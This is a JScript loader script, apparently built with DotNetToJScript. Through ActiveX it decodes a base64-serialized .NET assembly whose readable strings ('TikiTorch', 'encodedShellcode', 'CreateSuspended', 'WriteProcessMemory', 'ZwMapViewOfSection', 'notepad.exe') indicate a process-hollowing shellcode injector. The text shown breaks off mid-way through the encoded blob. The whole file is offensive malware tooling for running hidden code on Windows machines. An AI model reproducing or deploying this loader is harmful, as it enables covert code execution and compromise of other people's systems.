function setversion() {
var shell = new ActiveXObject('WScript.Shell');
ver = 'v4.0.30319';
try {
shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
} catch(e) { 
ver = 'v2.0.50727';
}
shell.Environment('Process')('COMPLUS_Version') = ver;

}
function debug(s) {}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var tp = "";
var sc = "";

var obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+
"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+
"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+
"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+
"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+
"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+
"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+
"ZW1ibHkGFwAAAARMb2FkCg8MAAAAAC4AAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+
"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMACpy63QAAAAAA"+
"AAAA4AACIQsBMAAAJgAAAAYAAAAAAABqRQAAACAAAABgAAAAAAAQACAAAAACAAAEAAAAAAAAAAYA"+
"AAAAAAAAAKAAAAACAAAAAAAAAwBghQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAFUUA"+
"AE8AAAAAYAAAeAMAAAAAAAAAAAAAAAAAAAAAAAAAgAAADAAAAIxEAAA4AAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"+
"AAAALnRleHQAAABwJQAAACAAAAAmAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAeAMAAABg"+
"AAAABAAAACgAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAgAAAAAIAAAAsAAAAAAAAAAAA"+
"AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAElFAAAAAAAASAAAAAIABQC0KAAA2BsAAAMAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAagIoEgAACgAA"+
"AnIBAABwchkAAHAoAgAABgAqABswAwA1AAAAAQAAEQBzHwAABgoABgMEKBMAAApvHgAABgAA3hsL"+
"AHI7AABwB28UAAAKKBUAAAooFgAACgAA3gAqAAAAARAAAAAABwASGQAbFAAAARMwAwAnAAAAAgAA"+
"EQASAP4VBwAAAhIAKAUAAAYABnszAAAEAwZ7MwAABF5ZA1gLKwAHKgATMAIADgAAAAMAABEAAxZq"+
"/gQW/gEKKwAGKgAAEzABAAsAAAAEAAARACgGAAAGCisABioAEzAKAGkAAAAFAAARAAUKAnsSAAAE"+
"bigXAAAKCwJ7CgAABAMSABYoGAAAChYoGAAAChYoGAAAChIBFxYEKAQAAAYMAghqKBEAAAYW/gEN"+
"CSwWcnEAAHAIjBsAAAEoGQAACnMaAAAKegYHcxsAAAoTBCsAEQQqAAAAEzAHAFYAAAAGAAARABIA"+
"/hUIAAACAgIDKBAAAAZ9EgAABBIAAnsSAAAEfTwAAAQCfAoAAAQgAAAAEBYoGAAAChIAH0AgAAAA"+
"CBYoGAAACigDAAAGCwIHaigRAAAGDCsACCoAABMwBABRAAAABwAAEQACAigSAAAGH0B+HAAACigT"+
"AAAGChIAKB0AAAoWKBgAAAooHgAACgsHLAtypwAAcHMaAAAKegISACgdAAAKfQsAAAQCEgAoHwAA"+
"Cn0NAAAEKgAAABMwAwBLAAAACAAAEQACexIAAAQKA45pagZu/gILBywLcu0AAHBzIAAACnoAAnsL"+
"AAAEKCEAAAoMFg0rDQAICVgDCZFSAAkXWA0JA45p/gQTBBEELecAKgATMAoAWwAAAAkAABEAEgD+"+
"FQYAAAISAf4VBAAAAiAMAAAIDBYoGAAACgMWKBgAAAoWKBgAAAoXCBYoGAAAChYoGAAAChIAEgEo"+
"CQAABhb+AQ0JLAtyMQEAcHMaAAAKegcTBCsAEQQqABMwAwDJAAAACgAAEQAWCh8QaigXAAAKKCIA"+
"AAoLAAcoIQAACgwUDSgjAAAKGv4BEwQRBCwhAAgGWCC4AAAAUgYXWAoDKCQAAAoTBREFKCUAAAoN"+
"ACspAAgGWB9IUgYXWAoIBlgguAAAAFIGF1gKAygmAAAKEwYRBignAAAKDQAWEwcrEQgGEQdYWAkR"+
"B5FSEQcXWBMHEQcoIwAACv4EEwgRCC3gBigjAAAKWAoIBlgg/wAAAFIGF1gKCAZYIOAAAABSBhdY"+
"CgAGB3MoAAAKEwkrABEJKgAAABMwAgCZAAAACwAAEQB+HAAACgoAAyUMLAUIjmktBRbgCysJCBaP"+
"IAAAAeALAAcfPFhLDQcJ4FgTBBEEHxhYEwURBUkTBhEFHxBYEwcRB0oTCAIRCH0RAAAEKCMAAAoa"+
"/gETCREJLBYCfA8AAAQoKQAAChEIWCgYAAAKCisVAnwPAAAEKCoAAAoRCGpYKBcAAAoKABQMAAIG"+
"fRAAAAQGEworABEKKgAAABMwBQA/AQAADAAAEQASAP4VBQAAAhYLAxYSACgjAAAKHFoSASgMAAAG"+
"DAIIaigRAAAGFv4BEwYRBiwLcm0BAHBzGgAACnp+HAAACg0oIwAACo0gAAABEwQoIwAAChr+ARMH"+
"EQcsFwAGexsAAAQoJAAACh5YKBgAAAoNACsXAAZ7GwAABCgmAAAKHxBqWCgXAAAKDQB+HAAAChMF"+
"AwkRBBEEjmkSBSgNAAAGLA4RBX4cAAAKKB4AAAorARcTCBEILAtyuwEAcHMaAAAKeigjAAAKGv4B"+
"EwkRCSwQEQQWKCsAAAooGAAACg0rDhEEFigsAAAKKBcAAAoNAgl9DwAABAMJAnsTAAAEAnsTAAAE"+
"jmkSBSgNAAAGLA4RBX4cAAAKKB4AAAorARcTChEKLAtyAQIAcHMaAAAKegICexMAAAQoGQAABhML"+
"KwARCyoAGzAFAGkBAAANAAARAAIDexYAAAQfQH4cAAAKKBMAAAYKEgAoHQAAChYoGAAACigeAAAK"+
"LRQSACgfAAAKFigYAAAKKB4AAAorARcTBREFLAtyQwIAcHMaAAAKegISACgdAAAKfQwAAAQCEgAo"+
"HwAACn0OAAAEAhIAKB0AAAooGAAABgsAEgEoLQAACigYAAAKEwYSB/4VGgAAAQN7FgAABAJ7EAAA"+
"BBIBKC4AAAoRBhIHKA4AAAYsDhEHfhwAAAooHgAACisBFxMIEQgsGnKhAgBwKA8AAAaMIQAAASgZ"+
"AAAKcxoAAAp6AN4nABIBKC4AAAp+HAAACigvAAAKEwkRCSwNEgEoLgAACigwAAAKAADcIAAQAACN"+
"IAAAAQwSA/4VGgAAAQN7FgAABAJ7EAAABAggAAQAABIDKA0AAAYW/gETChEKLAty/QIAcHMaAAAK"+
"egN7FwAABCgLAAAGEwQRBBX+ARMLEQssC3INAwBwcxoAAAp6KgAAAAEQAAACAHcAZ94AJwAAAAAT"+
"MAEADAAAAAQAABEAAnsLAAAECisABiobMAIANAAAAAMAABEAAAJ7CwAABBYoGAAACigvAAAKCgYs"+
"EgJ7CgAABAJ7CwAABCgIAAAGJt4IAigRAAAKANwqARAAAAIAAQAqKwAIAAAAABMwAgBkAAAADgAA"+
"EQACAygXAAAGCgIGexYAAAQoGgAABiYCBI5pKBQAAAYW/gELBywLckkDAHBzGgAACnoCBI5pKBUA"+
"AAYAAgQoFgAABgACBigbAAAGAAZ7FwAABCgHAAAGAAZ7FgAABCgHAAAGACoTMAIAVQAAAAAAAAAC"+
"KBIAAAoAAAJ8CgAABP4VGgAAAQJ8CwAABP4VGgAAAQJ8DAAABP4VGgAAAQJ8DQAABP4VGgAAAQJ8"+
"DgAABP4VGgAAAQIgABAAAI0gAAABfRMAAAQqAAAAQlNKQgEAAQAAAAAADAAAAHY0LjAuMzAzMTkA"+
"AAAABQBsAAAACAkAACN+AAB0CQAA1AoAACNTdHJpbmdzAAAAAEgUAACQAwAAI1VTANgXAAAQAAAA"+
"I0dVSUQAAADoFwAA8AMAACNCbG9iAAAAAAAAAAIAAAFX3QIeCQIAAAD6ATMAFgAAAQAAACEAAAAI"+
"AAAAPQAAAB8AAABFAAAAMAAAAAsAAAAQAAAAAQAAAAEAAAAOAAAAAQAAAAMAAAACAAAADQAAAAEA"+
"AAABAAAABQAAAAAAhgUBAAAAAAAGAK0D0wcGABoE0wcGAMUClgcPAPMHAAAGAO0CZgYGAJADZgYG"+
"AHEDZgYGAAEEZgYGAM0DZgYGAOYDZgYGAAQDZgYGANkCtAcGAJ0CtAcGADgDZgYGAB8D2gQGAPsF"+
"QggGAFUDQggGAKsCwwoGAIAJpAUGAJ8GpAUGABoAFgEGAHsCpAUGAA8KpAUGAP4EpAUGADACpAUG"+
"AF8HpAUGABQApAUGAJkGpAUGAIAGpAUGAE4FtAcGACoHpAUGAE0EpAUGAAsApAUAAAAARwAAAAAA"+
"AQABAAEAEAAFBQAATQABAAEAAQEQAP0GAABNAAEAAwAKARAAagAAAFkAFgAgAA0BEABQAAAAWQAa"+
"ACAADQEQAH4AAABZACAAIAAKARAAigAAAFkAMgAgAAoBEACWAAAAWQA8ACAAVoA4BCgCVoCPAigC"+
"VoBOASgCVoDBCSgCVoC3CSgCVoBhBSgCVoCMASgCVoCvCCgCVoAzCigCAQDNAIcAAQDhAIcAAQDW"+
"AIcAAQDCAIcAAQC2AIcAAQCsAIcAAQACAYcAAQDyACgCAQDHACgCAQDrACsCUYCABC8CUYCOBDIC"+
"BgDNCIcABgB/AYcABgBCAS8CBgA3AS8CBgABAIcABgAlCYcABgArAIcABgA1AIcABgC/AYcABgCn"+
"AYcAAQAKASgCAQC0AYcAAQDlBocAAQA4AocAAQCkACgCAQCoACgCAQBcBCgCAQBkBCgCAQBeCCgC"+
"AQBsCCgCAQASCCgCAQA6CCgCAQBCCjUCAQCcATUCAQApAIcAAQAcCocAAQAmCocAAQBXB4cABgCe"+
"BSgCBgB1BCgCBgBICYcABgBYCYcABgAkBYcABgCpBygCBgBwAigCBgCwCigCBgBWBTUCBgDLBTUC"+
"BgD7CSgCBgDyCS8CUCAAAAAAhhhRBwYAAQBsIAAAAACGAFICOAIBAAAAAACAAJEgCgY+AgMAAAAA"+
"AIAAkSAaBkwCCgAAAAAAgACRIKkGXAIUAAAAAACAAJEg/ghjAhUAAAAAAIAAkSAXAkMBFQAAAAAA"+
"gACRIC0GZwIWAAAAAACAAJEgvwhtAhgAAAAAAIAAkSBOCn8CIgAAAAAAgACRIHIBiQInAAAAAACA"+
"AJEg1giOAigAAAAAAIAAkSBnCpoCLQAAAAAAgACRIHkKpQIyAAAAAACAAJEgRAevAjcAwCAAAAAA"+
"hgDyAbMCNwD0IAAAAACBAKQIuAI4ABAhAAAAAIYA2Qm9AjkAKCEAAAAAhgBbBsECOQCgIQAAAACG"+
"AAwGzQI8AAQiAAAAAIYASwbSAj0AZCIAAAAAhgDaAdcCPgC8IgAAAACGABAJ3QI/ACQjAAAAAIYA"+
"DwXjAkAA/CMAAAAAgQAEB+0CQQCkJAAAAACGAIwK8wJCAPAlAAAAAIYAAwr4AkMAeCcAAAAAhgAg"+
"B70CRACQJwAAAADEAMIEBgBEAOAnAAAAAIYAhwH+AkQAUCgAAAAAhhhRBwYARgAAAAEA8AgAAAIA"+
"yQEAAAEAeAYAAAIAlggAAAMAeggAAAQAuQQAAAUA5AkAAAYAhAcAAAcAKgIAAAEAeAYAAAIAHQkA"+
"AAMA7wYAAAQAcAkAAAUAngQAAAYA0AQAAAcAsAQAAAgA0wYAAAkAhQIAAAoA7QkAAAEAvQYAAAEA"+
"IwIAAAEAQgYAAAIAaAkAAAEAQAIAAAIAWAIAAAMAZgcAAAQAdAcAAAUAAggAAAYALAgAAAcAywkA"+
"AAgANwcBAAkAxwYCAAoA2QUAAAEAzQgAAAIAPgkAAAMAqQQAAAQAlgkCAAUAhwkAAAEAfwEAAAEA"+
"zQgAAAIAgQgAAAMA6wUAAAQAqwUAAAUAtwUAAAEAzQgAAAIAMAkCAAMAFwcAAAQAqQQCAAUAXgEA"+
"AAEAzQgAAAIAMAkAAAMAFwcAAAQAmAQCAAUAvgUAAAEAywQAAAEAMQoAAAEADAIAAAIAowkAAAMA"+
"+AYAAAEAywQAAAEAywQAAAEA1gQAAAEAHwUAAAEAFwoAAAEA1gQAAAEAMQEAAAEAtwYAAAEA8AgA"+
"AAIA6AEJAFEHAQARAFEHBgAZAFEHCgApAFEHEAAxAFEHEAA5AFEHEABBAFEHEABJAFEHEABRAFEH"+
"EABZAFEHEABhAFEHFQBpAFEHEABxAFEHEAB5AFEHEACJAFEHGgCRAFEHBgCZAMIEBgCZAFEHBgC5"+
"APQEJwChAAACLQDBAHkJMQDJAGYCNwDRAKsJVwDRAKsJXADBAHkJYQDhAFEHEAAMAFEHbgDRAOAG"+
"hwAMAF8KigDRAJYKjwAMAFIElQDpAFEHEADRAKsJowDxADUFyADRAGwEzQDRAKsJ0QD5ACMI1gDR"+
"AKsJ3AD5ACMI4QAUAFEHbgDRABIAAgHRAD8ABgH5ABIAGwH5AD8AIgEUAF8KigAUAFIElQDRAKIK"+
"jwDxAEIFQwEJAAQAVwEJAAgAXAEJAAwAYQEJABAAZgEJABQAawEJABgAcAEJABwAXAEJACAAdQEJ"+
"ACQAawEIAFAAegELAFQAfwEnAIMA6gMuAAsABQMuABMADgMuABsALQMuACMANgMuACsARQMuADMA"+
"RQMuADsARQMuAEMANgMuAEsASwMuAFMARQMuAFsARQMuAGMAYwMuAGsAjQMuAHMAmgNDAFsA5AMI"+
"AAYAiAEBAAAAAAAIACAAPABCAEYASgB2AH0AmgCpALQA7gAKASkBSAEDADoAIwCUBWwFeQVnAOcA"+
"AAMHAAoGAQAAAwkAGgYBAAADCwCpBgIAAAMNAP4IAgAAAw8AFwICAAADEQAtBgEARgMTAL8IAgAA"+
"ARUATgoDAEABFwByAQMAAAMZANYIAQBAARsAZwoDAEADHQB5CgMAAAEfAEQHAwAEgAAAAQAAAAAA"+
"AAAAAAAAAAAFBQAABAAAAAAAAAAAAAAATgENAQAAAAAEAAMABQADAAYAAwAHAAMACAADAAAAAAAA"+
"UmVzZXJ2ZWQxAFVJbnQzMgBUb0ludDMyAEtleVZhbHVlUGFpcmAyAGxwUmVzZXJ2ZWQyAFJlc2Vy"+
"dmVkMwBUb0ludDY0ADxNb2R1bGU+AFBST0NFU1NfQkFTSUNfSU5GT1JNQVRJT04AUFJPQ0VTU19J"+
"TkZPUk1BVElPTgBTVEFSVFVQSU5GTwBTWVNURU1fSU5GTwBMQVJHRV9JTlRFR0VSAGR3WABkd1kA"+
"cE1vZEJhc2VfAHJlbW90ZXNpemVfAGxvY2Fsc2l6ZV8Ac2VjdGlvbl8AcmVtb3RlbWFwXwBsb2Nh"+
"bG1hcF8AaW5uZXJfAHJ2YUVudHJ5T2Zmc2V0XwBwRW50cnlfAGNiAG1zY29ybGliAFN5c3RlbS5D"+
"b2xsZWN0aW9ucy5HZW5lcmljAGhQcm9jAGR3VGhyZWFkSWQAZHdQcm9jZXNzSWQAUGFnZUV4ZWN1"+
"dGVSZWFkAGxwTnVtYmVyT2ZCeXRlc1JlYWQAUmVzdW1lVGhyZWFkAGhUaHJlYWQATG9hZABDcmVh"+
"dGVTdXNwZW5kZWQAY2JSZXNlcnZlZABNb3JlUmVzZXJ2ZWQAbHBSZXNlcnZlZABVbmlxdWVQaWQA"+
"ZW5jb2RlZFNoZWxsY29kZQBDb3B5U2hlbGxjb2RlAHNoZWxsY29kZQByb3VuZF90b19wYWdlAGdl"+
"dF9NZXNzYWdlAHByb2NIYW5kbGUAQ2xvc2VIYW5kbGUAaGFuZGxlAGhGaWxlAENvbnNvbGUAbHBU"+
"aXRsZQBscEFwcGxpY2F0aW9uTmFtZQBGbGFtZQBscENvbW1hbmRMaW5lAFdyaXRlTGluZQBkd1By"+
"b2NUeXBlAFZhbHVlVHlwZQBhbGxvY3R5cGUAUGFnZVJlYWRXcml0ZQBHdWlkQXR0cmlidXRlAFVu"+
"dmVyaWZpYWJsZUNvZGVBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0"+
"cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUA"+
"VGFyZ2V0RnJhbWV3b3JrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAU2Vj"+
"dXJpdHlQZXJtaXNzaW9uQXR0cmlidXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBB"+
"c3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1"+
"dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFz"+
"c2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBQYWdl"+
"UmVhZFdyaXRlRXhlY3V0ZQBCeXRlAGdldF9WYWx1ZQBkd1hTaXplAGR3WVNpemUAZ2V0X1NpemUA"+
"ZHdQYWdlU2l6ZQBBdHRyaWJ1dGVTaXplAFBhdGNoU2l6ZQBuU2l6ZQBjb21taXRTaXplAGR3U2l6"+
"ZQB2aWV3U2l6ZQBwTWF4U2l6ZQBGaW5hbGl6ZQBzaXplAHN0dWZmAGJ1ZgBTeXN0ZW0uUnVudGlt"+
"ZS5WZXJzaW9uaW5nAEZyb21CYXNlNjRTdHJpbmcAVGlraVRvcmNoAEJ1aWxkRW50cnlQYXRjaABw"+
"YXRoAGR3QWN0aXZlUHJvY01hc2sAQWxsb2NIR2xvYmFsAEZyZWVIR2xvYmFsAE1hcnNoYWwAd1By"+
"b2NMZXZlbABHZW5lcmljQWxsAEtlcm5lbDMyLmRsbABrZXJuZWwzMi5kbGwAVGlraVRvcmNoLmRs"+
"bABudGRsbC5kbGwAZHdPZW0AU3lzdGVtAFByb2NJbmZvTGVuAHJldGxlbgBscE51bVdyaXR0ZW4A"+
"d1Byb2NSZXZpc2lvbgBscFByb2NJbmZvcm1hdGlvbgBwcm9jSW5mb3JtYXRpb24AU2VjdXJpdHlB"+
"Y3Rpb24AWndDcmVhdGVTZWN0aW9uAFp3TWFwVmlld09mU2VjdGlvbgBad1VubWFwVmlld09mU2Vj"+
"dGlvbgBoU2VjdGlvbgBTZXRMb2NhbFNlY3Rpb24ATWFwU2VjdGlvbgBTeXN0ZW0uUmVmbGVjdGlv"+
"bgBzZWN0aW9uAEluZGV4T3V0T2ZSYW5nZUV4Y2VwdGlvbgBTeXN0ZW1FeGNlcHRpb24AR2V0U3lz"+
"dGVtSW5mbwBwSW5mbwBscFN5c0luZm8AbHBTdGFydGluZm8AaW5oZXJpdERpc3BvAFplcm8AbHBE"+
"ZXNrdG9wAGJhc2VBZGRyAGFkZHIATG9hZGVyAEdldEVudHJ5RnJvbUJ1ZmZlcgBscEJ1ZmZlcgBH"+
"ZXRCdWZmZXIAQml0Q29udmVydGVyAGxwQ3VycmVudERpcgBHZXRMYXN0RXJyb3IALmN0b3IAaFN0"+
"ZEVycgBJbnRQdHIAbHBQcm9jQXR0cmlicwBscFRocmVhZEF0dHJpYnMAYWxsb2NhdGlvbkF0dHJp"+
"YnMAU3lzdGVtLkRpYWdub3N0aWNzAGR3TnVtUHJvY3MAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNl"+
"cnZpY2VzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMARGVidWdnaW5nTW9kZXMAYklu"+
"aGVyaXRIYW5kbGVzAGR3RmlsbEF0dHJpYnV0ZXMAR2V0Qnl0ZXMAZHdDcmVhdGVGbGFncwBkd0Zs"+
"YWdzAFN5c3RlbS5TZWN1cml0eS5QZXJtaXNzaW9ucwBkd1hDb3VudENoYXJzAGR3WUNvdW50Q2hh"+
"cnMAcEF0dHJzAHByb2NJbmZvcm1hdGlvbkNsYXNzAGRlc2lyZWRBY2Nlc3MAbnRfc3VjY2VzcwBE"+
"ZXRhY2hlZFByb2Nlc3MAQ3JlYXRlUHJvY2VzcwBoUHJvY2VzcwBad1F1ZXJ5SW5mb3JtYXRpb25Q"+
"cm9jZXNzAHRhcmdldFByb2Nlc3MAR2V0Q3VycmVudFByb2Nlc3MAU3RhcnRQcm9jZXNzAHByb2Nl"+
"c3MAUGViQWRkcmVzcwBscEJhc2VBZGRyZXNzAGxwQWRkcmVzcwBscE1pbkFwcEFkZHJlc3MAbHBN"+
"YXhBcHBBZGRyZXNzAGFkZHJlc3MAemVyb0JpdHMAQ29uY2F0AE9iamVjdABscGZsT2xkUHJvdGVj"+
"dABmbE5ld1Byb3RlY3QAcHJvdGVjdABvcF9FeHBsaWNpdABTZWNDb21taXQATWVtQ29tbWl0AGxw"+
"RW52aXJvbm1lbnQAR2V0Q3VycmVudABwYWdlUHJvdABwcm90AEhpZ2hQYXJ0AExvd1BhcnQATWFw"+
"QW5kU3RhcnQAQ29udmVydABkZXN0AGhTdGRJbnB1dABoU3RkT3V0cHV0AHYAQ3JlYXRlTm9XaW5k"+
"b3cAd1Nob3dXaW5kb3cAVmlydHVhbFByb3RlY3RFeABnZXRfS2V5AFJlYWRQcm9jZXNzTWVtb3J5"+
"AFdyaXRlUHJvY2Vzc01lbW9yeQBGaW5kRW50cnkAb3BfRXF1YWxpdHkAb3BfSW5lcXVhbGl0eQBk"+
"d0FsbG9jR3JhbnVsYXJpdHkAU3lzdGVtLlNlY3VyaXR5AAAAF24AbwB0AGUAcABhAGQALgBlAHgA"+
"ZQAAIVoAQQBCADEAQQBHADAAQQBiAFEAQgA1AEEAQQA9AD0AADVbAHgAXQAgAFMAbwBtAGUAdABo"+
"AGkAbgBnACAAdwBlAG4AdAAgAHcAcgBvAG4AZwAhACEAADVbAHgAXQAgAFMAbwBtAGUAdABoAGkA"+
"bgBnACAAdwBlAG4AdAAgAHcAcgBvAG4AZwAhACAAAEVbAHgAXQAgAEYAYQBpAGwAZQBkACAAdABv"+
"ACAAbQBhAHAAIAB2AGkAZQB3ACAAbwBmACAAcwBlAGMAdABpAG8AbgAhAABDWwB4AF0AIABTAGgA"+
"ZQBsAGwAYwBvAGQAZQAgAGIAdQBmAGYAZQByACAAaQBzACAAdABvAG8AIABsAG8AbgBnACEAADtb"+
"AHgAXQAgAEYAYQBpAGwAZQBkACAAdABvACAAYwByAGUAYQB0AGUAIABwAHIAbwBjAGUAcwBzACEA"+
"AE1bAHgAXQAgAEYAYQBpAGwAZQBkACAAdABvACAAZwBlAHQAIABwAHIAbwBjAGUAcwBzACAAaQBu"+
"AGYAbwByAG0AYQB0AGkAbwBuACEAAEVbAHgAXQAgAEYAYQBpAGwAZQBkACAAdABvACAAcgBlAGEA"+
"ZAAgAHAAcgBvAGMAZQBzAHMAIABtAGUAbQBvAHIAeQAhAABBWwB4AF0AIABGAGEAaQBsAGUAZAAg"+
"AHQAbwAgAHIAZQBhAGQAIABtAG8AZAB1AGwAZQAgAHMAdABhAHIAdAAhAABdWwB4AF0AIABGAGEA"+
"aQBsAGUAZAAgAHQAbwAgAG0AYQBwACAAcwBlAGMAdABpAG8AbgAgAGkAbgB0AG8AIAB0AGEAcgBn"+
"AGUAdAAgAHAAcgBvAGMAZQBzAHMAIQAAW1sAeABdACAARgBhAGkAbABlAGQAIAB0AG8AIAB3AHIA"+
"aQB0AGUAIABwAGEAdABjAGgAIAB0AG8AIABzAHQAYQByAHQAIABsAG8AYwBhAHQAaQBvAG4AIQAg"+
"AAAPRgBhAGkAbABlAGQAIQAAO1sAeABdACAARgBhAGkAbABlAGQAIAB0AG8AIAByAGUAcwB0AGEA"+
"cgB0ACAAdABoAHIAZQBhAGQAIQAAQ1sAeABdACAARgBhAGkAbABlAGQAIAB0AG8AIABjAHIAZQBh"+
"AHQAZQAgAG4AZQB3ACAAcwBlAGMAdABpAG8AbgAhAAAAAABUMC2SeCHBQ5Mk9lp5wWvvAAQgAQEI"+
"AyAAAQUgAQEREQQgAQEOBCABAQIFIAEBEUEGBwISDBJRBQABHQUOAyAADgUAAg4ODgQAAQEOBQcC"+
"ERwJAwcBAgMHARgMBwUYGAgCFRFVAhgYBAABGAoEAAEYCAUAAg4cHAYVEVUCGBgHIAIBEwATAQYH"+
"AxEgCAIJBwIVEVUCGBgCAgYYBCAAEwAFAAICGBgEIAATAQgHBQkCDwUIAgUAAQ8BGAoHBREYERAJ"+
"AhEQEwcKCBgPBR0FAggKCAIVEVUCCBgEAAEYGAMAAAgEAAEIGAUAAR0FCAQAAQoYBQABHQUKBhUR"+
"VQIIGBMHCxgPBUUdBQkPBQ8FBw8FCAIYAyAACAMgAAoQBwwRFAkIGB0FGAICAgICGAYAAggdBQgG"+
"AAIKHQUIGQcMFRFVAhgYFRFVAggYHQUYCQIYGAICAgIEAAEBGAUHAhEQAgi3elxWGTTgiQRAAAAA"+
"BAQAAAAEIAAAAAQAEAAABAAAAAgEAAAAEAQIAAAABBgAAAAIEAAAAAAAAACAni4BgIRTeXN0ZW0u"+
"U2VjdXJpdHkuUGVybWlzc2lvbnMuU2VjdXJpdHlQZXJtaXNzaW9uQXR0cmlidXRlLCBtc2Nvcmxp"+
"YiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1"+
"YzU2MTkzNGUwODkVAVQCEFNraXBWZXJpZmljYXRpb24BAgYJAwYdBQIGCAIGCwIGBwUgAgEODg0A"+
"BwgQGAkYEBEgCQkYDwAKCBgYEBgYGBgQGAgJCQYAAQEQERwDAAAYBQACCBgYEQAKAhgOGBgCCRgY"+
"EBEYEBEQCQAFAhgYGAkQCQQAAQkYCwAFCBgIEBEUCRAJCgAFAhgYHQUIEBgJAAUCGBgYGBAYAwAA"+
"CQQgAQkJBCABAgoDIAAYCyADFRFVAhgYGAkYBCABAgkEIAEBCQUgAQEdBQUgAREQDgkgARURVQII"+
